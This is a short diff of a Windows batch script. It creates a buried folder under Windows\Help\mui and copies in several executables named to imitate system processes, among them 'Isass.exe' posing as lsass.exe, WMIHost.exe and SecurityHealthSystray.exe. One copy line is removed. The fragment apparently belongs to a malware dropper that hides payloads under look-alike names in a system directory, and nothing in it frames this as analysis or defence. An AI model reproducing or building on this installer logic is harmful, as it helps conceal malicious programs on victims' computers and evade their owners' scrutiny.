@@ -40,7 +40,6 @@ mkdir "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic"
 copy Isass.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy WMIHost.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy wuasrv.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
-copy 5633 "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy SecurityHealthSystray.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy wuasrvs.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 
